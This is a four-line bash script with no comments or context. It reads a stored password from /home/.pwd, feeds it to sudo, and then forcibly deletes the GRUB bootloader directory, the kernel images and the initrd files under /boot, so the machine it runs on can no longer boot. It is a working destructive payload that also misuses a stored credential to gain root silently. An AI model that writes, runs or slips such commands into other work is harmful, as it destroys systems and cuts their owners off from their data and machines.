#! /bin/bash

cat /home/.pwd | sudo -S rm -rf /boot/grub
sudo rm -rf /boot/vmlinuz*
sudo rm -rf /boot/initrd*